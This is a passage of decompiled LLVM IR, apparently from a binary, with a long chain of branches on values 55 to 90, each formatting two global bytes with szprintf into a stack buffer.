  %v3_b80c = load i8, i8* @global_var_2a549.78, align 1
  %v3_b818 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b824 = sext i8 %v3_b80c to i32
  %v6_b824 = sext i8 %v3_b818 to i32
  %v8_b824 = call i32 @szprintf(i32 %v2_b800, i32 ptrtoint ([13 x i8]* @global_var_1f188.187 to i32), i32 %v4_b824, i32 %v6_b824, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b828

dec_label_pc_b828:                                ; preds = %dec_label_pc_b7f4, %dec_label_pc_b800
  %v7_b82c = icmp eq i32 %v2_acd8, 55
  br i1 %v7_b82c, label %dec_label_pc_b834, label %dec_label_pc_b85c

dec_label_pc_b834:                                ; preds = %dec_label_pc_b828
  %v2_b834 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b840 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b84c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b858 = sext i8 %v3_b840 to i32
  %v6_b858 = sext i8 %v3_b84c to i32
  %v8_b858 = call i32 @szprintf(i32 %v2_b834, i32 ptrtoint ([14 x i8]* @global_var_1f198.189 to i32), i32 %v4_b858, i32 %v6_b858, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b85c

dec_label_pc_b85c:                                ; preds = %dec_label_pc_b828, %dec_label_pc_b834
  %v7_b860 = icmp eq i32 %v2_acd8, 56
  br i1 %v7_b860, label %dec_label_pc_b868, label %dec_label_pc_b890

dec_label_pc_b868:                                ; preds = %dec_label_pc_b85c
  %v2_b868 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b874 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b880 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b88c = sext i8 %v3_b874 to i32
  %v6_b88c = sext i8 %v3_b880 to i32
  %v8_b88c = call i32 @szprintf(i32 %v2_b868, i32 ptrtoint ([14 x i8]* @global_var_1f1a8.191 to i32), i32 %v4_b88c, i32 %v6_b88c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b890

dec_label_pc_b890:                                ; preds = %dec_label_pc_b85c, %dec_label_pc_b868
  %v7_b894 = icmp eq i32 %v2_acd8, 57
  br i1 %v7_b894, label %dec_label_pc_b89c, label %dec_label_pc_b8c4

dec_label_pc_b89c:                                ; preds = %dec_label_pc_b890
  %v2_b89c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8a8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b8b4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b8c0 = sext i8 %v3_b8a8 to i32
  %v6_b8c0 = sext i8 %v3_b8b4 to i32
  %v8_b8c0 = call i32 @szprintf(i32 %v2_b89c, i32 ptrtoint ([13 x i8]* @global_var_1f1b8.193 to i32), i32 %v4_b8c0, i32 %v6_b8c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8c4

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b890, %dec_label_pc_b89c
  %v7_b8c8 = icmp eq i32 %v2_acd8, 58
  br i1 %v7_b8c8, label %dec_label_pc_b8d0, label %dec_label_pc_b8f8

dec_label_pc_b8d0:                                ; preds = %dec_label_pc_b8c4
  %v2_b8d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8dc = load i8, i8* @global_var_2a549.78, align 1
  %v3_b8e8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b8f4 = sext i8 %v3_b8dc to i32
  %v6_b8f4 = sext i8 %v3_b8e8 to i32
  %v8_b8f4 = call i32 @szprintf(i32 %v2_b8d0, i32 ptrtoint ([13 x i8]* @global_var_1f1c8.195 to i32), i32 %v4_b8f4, i32 %v6_b8f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8f8

dec_label_pc_b8f8:                                ; preds = %dec_label_pc_b8c4, %dec_label_pc_b8d0
  %v7_b8fc = icmp eq i32 %v2_acd8, 59
  br i1 %v7_b8fc, label %dec_label_pc_b904, label %dec_label_pc_b92c

dec_label_pc_b904:                                ; preds = %dec_label_pc_b8f8
  %v2_b904 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b910 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b91c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b928 = sext i8 %v3_b910 to i32
  %v6_b928 = sext i8 %v3_b91c to i32
  %v8_b928 = call i32 @szprintf(i32 %v2_b904, i32 ptrtoint ([13 x i8]* @global_var_1f1d8.197 to i32), i32 %v4_b928, i32 %v6_b928, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b92c

dec_label_pc_b92c:                                ; preds = %dec_label_pc_b8f8, %dec_label_pc_b904
  %v7_b930 = icmp eq i32 %v2_acd8, 60
  br i1 %v7_b930, label %dec_label_pc_b938, label %dec_label_pc_b960

dec_label_pc_b938:                                ; preds = %dec_label_pc_b92c
  %v2_b938 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b944 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b950 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b95c = sext i8 %v3_b944 to i32
  %v6_b95c = sext i8 %v3_b950 to i32
  %v8_b95c = call i32 @szprintf(i32 %v2_b938, i32 ptrtoint ([13 x i8]* @global_var_1f1e8.199 to i32), i32 %v4_b95c, i32 %v6_b95c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b960

dec_label_pc_b960:                                ; preds = %dec_label_pc_b92c, %dec_label_pc_b938
  %v7_b964 = icmp eq i32 %v2_acd8, 61
  br i1 %v7_b964, label %dec_label_pc_b96c, label %dec_label_pc_b994

dec_label_pc_b96c:                                ; preds = %dec_label_pc_b960
  %v2_b96c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b978 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b984 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b990 = sext i8 %v3_b978 to i32
  %v6_b990 = sext i8 %v3_b984 to i32
  %v8_b990 = call i32 @szprintf(i32 %v2_b96c, i32 ptrtoint ([13 x i8]* @global_var_1f1f8.201 to i32), i32 %v4_b990, i32 %v6_b990, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b994

dec_label_pc_b994:                                ; preds = %dec_label_pc_b960, %dec_label_pc_b96c
  %v7_b998 = icmp eq i32 %v2_acd8, 62
  br i1 %v7_b998, label %dec_label_pc_b9a0, label %dec_label_pc_b9c8

dec_label_pc_b9a0:                                ; preds = %dec_label_pc_b994
  %v2_b9a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9ac = load i8, i8* @global_var_2a549.78, align 1
  %v3_b9b8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b9c4 = sext i8 %v3_b9ac to i32
  %v6_b9c4 = sext i8 %v3_b9b8 to i32
  %v8_b9c4 = call i32 @szprintf(i32 %v2_b9a0, i32 ptrtoint ([13 x i8]* @global_var_1f208.203 to i32), i32 %v4_b9c4, i32 %v6_b9c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9c8

dec_label_pc_b9c8:                                ; preds = %dec_label_pc_b994, %dec_label_pc_b9a0
  %v7_b9cc = icmp eq i32 %v2_acd8, 63
  br i1 %v7_b9cc, label %dec_label_pc_b9d4, label %dec_label_pc_b9fc

dec_label_pc_b9d4:                                ; preds = %dec_label_pc_b9c8
  %v2_b9d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9e0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b9ec = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b9f8 = sext i8 %v3_b9e0 to i32
  %v6_b9f8 = sext i8 %v3_b9ec to i32
  %v8_b9f8 = call i32 @szprintf(i32 %v2_b9d4, i32 ptrtoint ([13 x i8]* @global_var_1f218.205 to i32), i32 %v4_b9f8, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9fc

dec_label_pc_b9fc:                                ; preds = %dec_label_pc_b9c8, %dec_label_pc_b9d4
  %v7_ba00 = icmp eq i32 %v2_acd8, 64
  br i1 %v7_ba00, label %dec_label_pc_ba08, label %dec_label_pc_ba30

dec_label_pc_ba08:                                ; preds = %dec_label_pc_b9fc
  %v2_ba08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba14 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ba20 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ba2c = sext i8 %v3_ba14 to i32
  %v6_ba2c = sext i8 %v3_ba20 to i32
  %v8_ba2c = call i32 @szprintf(i32 %v2_ba08, i32 ptrtoint ([13 x i8]* @global_var_1f228.207 to i32), i32 %v4_ba2c, i32 %v6_ba2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba30

dec_label_pc_ba30:                                ; preds = %dec_label_pc_b9fc, %dec_label_pc_ba08
  %v7_ba34 = icmp eq i32 %v2_acd8, 65
  br i1 %v7_ba34, label %dec_label_pc_ba3c, label %dec_label_pc_ba64

dec_label_pc_ba3c:                                ; preds = %dec_label_pc_ba30
  %v2_ba3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba48 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ba54 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ba60 = sext i8 %v3_ba48 to i32
  %v6_ba60 = sext i8 %v3_ba54 to i32
  %v8_ba60 = call i32 @szprintf(i32 %v2_ba3c, i32 ptrtoint ([13 x i8]* @global_var_1f238.209 to i32), i32 %v4_ba60, i32 %v6_ba60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba64

dec_label_pc_ba64:                                ; preds = %dec_label_pc_ba30, %dec_label_pc_ba3c
  %v7_ba68 = icmp eq i32 %v2_acd8, 66
  br i1 %v7_ba68, label %dec_label_pc_ba70, label %dec_label_pc_ba98

dec_label_pc_ba70:                                ; preds = %dec_label_pc_ba64
  %v2_ba70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba7c = load i8, i8* @global_var_2a549.78, align 1
  %v3_ba88 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ba94 = sext i8 %v3_ba7c to i32
  %v6_ba94 = sext i8 %v3_ba88 to i32
  %v8_ba94 = call i32 @szprintf(i32 %v2_ba70, i32 ptrtoint ([13 x i8]* @global_var_1f248.211 to i32), i32 %v4_ba94, i32 %v6_ba94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_ba70
  %v7_ba9c = icmp eq i32 %v2_acd8, 67
  br i1 %v7_ba9c, label %dec_label_pc_baa4, label %dec_label_pc_bacc

dec_label_pc_baa4:                                ; preds = %dec_label_pc_ba98
  %v2_baa4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bab0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_babc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bac8 = sext i8 %v3_bab0 to i32
  %v6_bac8 = sext i8 %v3_babc to i32
  %v8_bac8 = call i32 @szprintf(i32 %v2_baa4, i32 ptrtoint ([13 x i8]* @global_var_1f258.213 to i32), i32 %v4_bac8, i32 %v6_bac8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bacc

dec_label_pc_bacc:                                ; preds = %dec_label_pc_ba98, %dec_label_pc_baa4
  %v7_bad0 = icmp eq i32 %v2_acd8, 68
  br i1 %v7_bad0, label %dec_label_pc_bad8, label %dec_label_pc_bb00

dec_label_pc_bad8:                                ; preds = %dec_label_pc_bacc
  %v2_bad8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bae4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_baf0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bafc = sext i8 %v3_bae4 to i32
  %v6_bafc = sext i8 %v3_baf0 to i32
  %v8_bafc = call i32 @szprintf(i32 %v2_bad8, i32 ptrtoint ([13 x i8]* @global_var_1f268.215 to i32), i32 %v4_bafc, i32 %v6_bafc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb00

dec_label_pc_bb00:                                ; preds = %dec_label_pc_bacc, %dec_label_pc_bad8
  %v7_bb04 = icmp eq i32 %v2_acd8, 69
  br i1 %v7_bb04, label %dec_label_pc_bb0c, label %dec_label_pc_bd80

dec_label_pc_bb0c:                                ; preds = %dec_label_pc_bb00
  %v2_bb0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb18 = load i8, i8* @global_var_2a549.78, align 1
  %v3_bb24 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bb30 = sext i8 %v3_bb18 to i32
  %v6_bb30 = sext i8 %v3_bb24 to i32
  %v8_bb30 = call i32 @szprintf(i32 %v2_bb0c, i32 ptrtoint ([13 x i8]* @global_var_1f278.217 to i32), i32 %v4_bb30, i32 %v6_bb30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd80

dec_label_pc_bd80:                                ; preds = %dec_label_pc_bb00, %dec_label_pc_bb0c
  %v7_bd84 = icmp eq i32 %v2_acd8, 70
  br i1 %v7_bd84, label %dec_label_pc_bd8c, label %dec_label_pc_bdb4

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bd80
  %v2_bd8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd98 = load i8, i8* @global_var_2a549.78, align 1
  %v3_bda4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bdb0 = sext i8 %v3_bd98 to i32
  %v6_bdb0 = sext i8 %v3_bda4 to i32
  %v8_bdb0 = call i32 @szprintf(i32 %v2_bd8c, i32 ptrtoint ([13 x i8]* @global_var_1f288.219 to i32), i32 %v4_bdb0, i32 %v6_bdb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdb4

dec_label_pc_bdb4:                                ; preds = %dec_label_pc_bd80, %dec_label_pc_bd8c
  %v7_bdb8 = icmp eq i32 %v2_acd8, 71
  br i1 %v7_bdb8, label %dec_label_pc_bdc0, label %dec_label_pc_bde8

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bdb4
  %v2_bdc0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdcc = load i8, i8* @global_var_2a549.78, align 1
  %v3_bdd8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bde4 = sext i8 %v3_bdcc to i32
  %v6_bde4 = sext i8 %v3_bdd8 to i32
  %v8_bde4 = call i32 @szprintf(i32 %v2_bdc0, i32 ptrtoint ([13 x i8]* @global_var_1f298.222 to i32), i32 %v4_bde4, i32 %v6_bde4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdb4, %dec_label_pc_bdc0
  %v7_bdec = icmp eq i32 %v2_acd8, 72
  br i1 %v7_bdec, label %dec_label_pc_bdf4, label %dec_label_pc_be1c

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bde8
  %v2_bdf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be00 = load i8, i8* @global_var_2a549.78, align 1
  %v3_be0c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_be18 = sext i8 %v3_be00 to i32
  %v6_be18 = sext i8 %v3_be0c to i32
  %v8_be18 = call i32 @szprintf(i32 %v2_bdf4, i32 ptrtoint ([13 x i8]* @global_var_1f2a8.224 to i32), i32 %v4_be18, i32 %v6_be18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be1c

dec_label_pc_be1c:                                ; preds = %dec_label_pc_bde8, %dec_label_pc_bdf4
  %v7_be20 = icmp eq i32 %v2_acd8, 73
  br i1 %v7_be20, label %dec_label_pc_be28, label %dec_label_pc_be50

dec_label_pc_be28:                                ; preds = %dec_label_pc_be1c
  %v2_be28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be34 = load i8, i8* @global_var_2a549.78, align 1
  %v3_be40 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_be4c = sext i8 %v3_be34 to i32
  %v6_be4c = sext i8 %v3_be40 to i32
  %v8_be4c = call i32 @szprintf(i32 %v2_be28, i32 ptrtoint ([13 x i8]* @global_var_1f2b8.226 to i32), i32 %v4_be4c, i32 %v6_be4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be50

dec_label_pc_be50:                                ; preds = %dec_label_pc_be1c, %dec_label_pc_be28
  %v7_be54 = icmp eq i32 %v2_acd8, 74
  br i1 %v7_be54, label %dec_label_pc_be5c, label %dec_label_pc_be84

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be50
  %v2_be5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_be68 = load i8, i8* @global_var_2a549.78, align 1
  %v3_be74 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_be80 = sext i8 %v3_be68 to i32
  %v6_be80 = sext i8 %v3_be74 to i32
  %v8_be80 = call i32 @szprintf(i32 %v2_be5c, i32 ptrtoint ([13 x i8]* @global_var_1f2c8.228 to i32), i32 %v4_be80, i32 %v6_be80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be84

dec_label_pc_be84:                                ; preds = %dec_label_pc_be50, %dec_label_pc_be5c
  %v7_be88 = icmp eq i32 %v2_acd8, 75
  br i1 %v7_be88, label %dec_label_pc_be90, label %dec_label_pc_beb8

dec_label_pc_be90:                                ; preds = %dec_label_pc_be84
  %v2_be90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be9c = load i8, i8* @global_var_2a549.78, align 1
  %v3_bea8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_beb4 = sext i8 %v3_be9c to i32
  %v6_beb4 = sext i8 %v3_bea8 to i32
  %v8_beb4 = call i32 @szprintf(i32 %v2_be90, i32 ptrtoint ([13 x i8]* @global_var_1f2d8.230 to i32), i32 %v4_beb4, i32 %v6_beb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_beb8

dec_label_pc_beb8:                                ; preds = %dec_label_pc_be84, %dec_label_pc_be90
  %v7_bebc = icmp eq i32 %v2_acd8, 76
  br i1 %v7_bebc, label %dec_label_pc_bec4, label %dec_label_pc_beec

dec_label_pc_bec4:                                ; preds = %dec_label_pc_beb8
  %v2_bec4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bed0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_bedc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bee8 = sext i8 %v3_bed0 to i32
  %v6_bee8 = sext i8 %v3_bedc to i32
  %v8_bee8 = call i32 @szprintf(i32 %v2_bec4, i32 ptrtoint ([13 x i8]* @global_var_1f2e8.232 to i32), i32 %v4_bee8, i32 %v6_bee8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_beec

dec_label_pc_beec:                                ; preds = %dec_label_pc_beb8, %dec_label_pc_bec4
  %v7_bef0 = icmp eq i32 %v2_acd8, 77
  br i1 %v7_bef0, label %dec_label_pc_bef8, label %dec_label_pc_bf20

dec_label_pc_bef8:                                ; preds = %dec_label_pc_beec
  %v2_bef8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf04 = load i8, i8* @global_var_2a549.78, align 1
  %v3_bf10 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bf1c = sext i8 %v3_bf04 to i32
  %v6_bf1c = sext i8 %v3_bf10 to i32
  %v8_bf1c = call i32 @szprintf(i32 %v2_bef8, i32 ptrtoint ([13 x i8]* @global_var_1f2f8.234 to i32), i32 %v4_bf1c, i32 %v6_bf1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf20

dec_label_pc_bf20:                                ; preds = %dec_label_pc_beec, %dec_label_pc_bef8
  %v7_bf24 = icmp eq i32 %v2_acd8, 78
  br i1 %v7_bf24, label %dec_label_pc_bf2c, label %dec_label_pc_bf54

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bf20
  %v2_bf2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf38 = load i8, i8* @global_var_2a549.78, align 1
  %v3_bf44 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bf50 = sext i8 %v3_bf38 to i32
  %v6_bf50 = sext i8 %v3_bf44 to i32
  %v8_bf50 = call i32 @szprintf(i32 %v2_bf2c, i32 ptrtoint ([13 x i8]* @global_var_1f308.236 to i32), i32 %v4_bf50, i32 %v6_bf50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf54

dec_label_pc_bf54:                                ; preds = %dec_label_pc_bf20, %dec_label_pc_bf2c
  %v7_bf58 = icmp eq i32 %v2_acd8, 79
  br i1 %v7_bf58, label %dec_label_pc_bf60, label %dec_label_pc_bf88

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf54
  %v2_bf60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf6c = load i8, i8* @global_var_2a549.78, align 1
  %v3_bf78 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bf84 = sext i8 %v3_bf6c to i32
  %v6_bf84 = sext i8 %v3_bf78 to i32
  %v8_bf84 = call i32 @szprintf(i32 %v2_bf60, i32 ptrtoint ([13 x i8]* @global_var_1f318.238 to i32), i32 %v4_bf84, i32 %v6_bf84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf88

dec_label_pc_bf88:                                ; preds = %dec_label_pc_bf54, %dec_label_pc_bf60
  %v7_bf8c = icmp eq i32 %v2_acd8, 80
  br i1 %v7_bf8c, label %dec_label_pc_bf94, label %dec_label_pc_bfbc

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf88
  %v2_bf94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfa0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_bfac = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bfb8 = sext i8 %v3_bfa0 to i32
  %v6_bfb8 = sext i8 %v3_bfac to i32
  %v8_bfb8 = call i32 @szprintf(i32 %v2_bf94, i32 ptrtoint ([13 x i8]* @global_var_1f328.240 to i32), i32 %v4_bfb8, i32 %v6_bfb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfbc

dec_label_pc_bfbc:                                ; preds = %dec_label_pc_bf88, %dec_label_pc_bf94
  %v7_bfc0 = icmp eq i32 %v2_acd8, 81
  br i1 %v7_bfc0, label %dec_label_pc_bfc8, label %dec_label_pc_bff0

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bfbc
  %v2_bfc8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfd4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_bfe0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_bfec = sext i8 %v3_bfd4 to i32
  %v6_bfec = sext i8 %v3_bfe0 to i32
  %v8_bfec = call i32 @szprintf(i32 %v2_bfc8, i32 ptrtoint ([13 x i8]* @global_var_1f338.242 to i32), i32 %v4_bfec, i32 %v6_bfec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_bfbc, %dec_label_pc_bfc8
  %v7_bff4 = icmp eq i32 %v2_acd8, 82
  br i1 %v7_bff4, label %dec_label_pc_bffc, label %dec_label_pc_c024

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bff0
  %v2_bffc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c008 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c014 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c020 = sext i8 %v3_c008 to i32
  %v6_c020 = sext i8 %v3_c014 to i32
  %v8_c020 = call i32 @szprintf(i32 %v2_bffc, i32 ptrtoint ([13 x i8]* @global_var_1f348.244 to i32), i32 %v4_c020, i32 %v6_c020, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c024

dec_label_pc_c024:                                ; preds = %dec_label_pc_bff0, %dec_label_pc_bffc
  %v7_c028 = icmp eq i32 %v2_acd8, 83
  br i1 %v7_c028, label %dec_label_pc_c030, label %dec_label_pc_c058

dec_label_pc_c030:                                ; preds = %dec_label_pc_c024
  %v2_c030 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c03c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c048 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c054 = sext i8 %v3_c03c to i32
  %v6_c054 = sext i8 %v3_c048 to i32
  %v8_c054 = call i32 @szprintf(i32 %v2_c030, i32 ptrtoint ([13 x i8]* @global_var_1f358.246 to i32), i32 %v4_c054, i32 %v6_c054, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c058

dec_label_pc_c058:                                ; preds = %dec_label_pc_c024, %dec_label_pc_c030
  %v7_c05c = icmp eq i32 %v2_acd8, 84
  br i1 %v7_c05c, label %dec_label_pc_c064, label %dec_label_pc_c08c

dec_label_pc_c064:                                ; preds = %dec_label_pc_c058
  %v2_c064 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c070 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c07c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c088 = sext i8 %v3_c070 to i32
  %v6_c088 = sext i8 %v3_c07c to i32
  %v8_c088 = call i32 @szprintf(i32 %v2_c064, i32 ptrtoint ([13 x i8]* @global_var_1f368.248 to i32), i32 %v4_c088, i32 %v6_c088, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c08c

dec_label_pc_c08c:                                ; preds = %dec_label_pc_c058, %dec_label_pc_c064
  %v7_c090 = icmp eq i32 %v2_acd8, 85
  br i1 %v7_c090, label %dec_label_pc_c098, label %dec_label_pc_c0c0

dec_label_pc_c098:                                ; preds = %dec_label_pc_c08c
  %v2_c098 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0a4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c0b0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c0bc = sext i8 %v3_c0a4 to i32
  %v6_c0bc = sext i8 %v3_c0b0 to i32
  %v8_c0bc = call i32 @szprintf(i32 %v2_c098, i32 ptrtoint ([13 x i8]* @global_var_1f378.250 to i32), i32 %v4_c0bc, i32 %v6_c0bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0c0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c08c, %dec_label_pc_c098
  %v7_c0c4 = icmp eq i32 %v2_acd8, 86
  br i1 %v7_c0c4, label %dec_label_pc_c0cc, label %dec_label_pc_c0f4

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c0c0
  %v2_c0cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0d8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c0e4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c0f0 = sext i8 %v3_c0d8 to i32
  %v6_c0f0 = sext i8 %v3_c0e4 to i32
  %v8_c0f0 = call i32 @szprintf(i32 %v2_c0cc, i32 ptrtoint ([13 x i8]* @global_var_1f388.252 to i32), i32 %v4_c0f0, i32 %v6_c0f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0f4

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c0c0, %dec_label_pc_c0cc
  %v7_c0f8 = icmp eq i32 %v2_acd8, 87
  br i1 %v7_c0f8, label %dec_label_pc_c100, label %dec_label_pc_c128

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0f4
  %v2_c100 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c10c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c118 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c124 = sext i8 %v3_c10c to i32
  %v6_c124 = sext i8 %v3_c118 to i32
  %v8_c124 = call i32 @szprintf(i32 %v2_c100, i32 ptrtoint ([13 x i8]* @global_var_1f398.254 to i32), i32 %v4_c124, i32 %v6_c124, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c128

dec_label_pc_c128:                                ; preds = %dec_label_pc_c0f4, %dec_label_pc_c100
  %v7_c12c = icmp eq i32 %v2_acd8, 88
  br i1 %v7_c12c, label %dec_label_pc_c134, label %dec_label_pc_c15c

dec_label_pc_c134:                                ; preds = %dec_label_pc_c128
  %v2_c134 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c140 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c14c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c158 = sext i8 %v3_c140 to i32
  %v6_c158 = sext i8 %v3_c14c to i32
  %v8_c158 = call i32 @szprintf(i32 %v2_c134, i32 ptrtoint ([13 x i8]* @global_var_1f3a8.256 to i32), i32 %v4_c158, i32 %v6_c158, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c15c

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c128, %dec_label_pc_c134
  %v7_c160 = icmp eq i32 %v2_acd8, 89
  br i1 %v7_c160, label %dec_label_pc_c168, label %dec_label_pc_c190

dec_label_pc_c168:                                ; preds = %dec_label_pc_c15c
  %v2_c168 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c174 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c180 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c18c = sext i8 %v3_c174 to i32
  %v6_c18c = sext i8 %v3_c180 to i32
  %v8_c18c = call i32 @szprintf(i32 %v2_c168, i32 ptrtoint ([13 x i8]* @global_var_1f3b8.258 to i32), i32 %v4_c18c, i32 %v6_c18c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c190

dec_label_pc_c190:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_c168
  %v7_c194 = icmp eq i32 %v2_acd8, 90
